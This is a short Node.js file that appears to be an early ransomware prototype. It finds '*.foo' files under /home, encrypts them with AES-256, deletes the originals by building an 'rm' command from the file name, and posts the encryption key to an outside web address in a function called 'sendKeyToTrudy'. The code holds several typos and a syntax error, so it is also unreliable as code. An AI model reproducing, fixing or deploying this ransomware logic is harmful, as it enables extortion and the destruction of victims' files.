var fileFinder = require('fs-finder');
var secureRandom = require('secure-random-string');
var fileStream = require('fs');
var publicKeyTrudy = ;

var crypto = require('crypto'),
    algorithm = 'aes-256-ctr',
    password = secureRandom(64);
console.log(password);

var files = fileFinder.from('/home').findFiles('*.foo');
var encryptedFiles = [];

function encrypt(text){
  var cipher = crypto.createCipher(algorithm,password)
  var crypted = cipher.update(text,'utf8','hex')
  crypted += cipher.final('hex');
  return crypted;
}
 
function decrypt(text){
  var decipher = crypto.createDecipher(algorithm,password)
  var dec = decipher.update(text,'hex','utf8')
  dec += decipher.final('utf8');
  return dec;
}

function encryptFiles(files){
	files.forEach(function(file) {
         var cipher = crypto.createCipher(algorithm,password);
	 var input = fileStream.createReadStream(file);
	 var output = fileStream.createWriteStream(file +'lock');
	 input.pipe(cipher).pipe(output);
	 ecryptedFiles.push(file +'.lock');
	});
}

function deCryptFiles(files){
	files.forEach(function(file) {
         var deCipher = crypto.createDecipher(algorithm,password);
	 var input = fileStream.createReadStream(file);
	 var output = fileStream.createWriteStream(file.slice(0, -5));
	 input.pipe(deCipher).pipe(output);
	});
}

function deleteOriginalFiles(files) {
  var sys = require('sys');
  var exe = requre('child-process').exec;
  files.forEach(function(file) {
	exec("rm " + file);
 });
}

function sendKeyToTrudy(key) {
var request = require('request');
request.post(
    'http://www.yoursiste.com/formpage',
    { json: { key: key } },
    function (error, response, body) {
        if (!error && response.statusCode == 200) {
            console.log(body)
        }
    }
);
}
var hw = "Hello World";

//console.log(currentPath);

console.log(files);
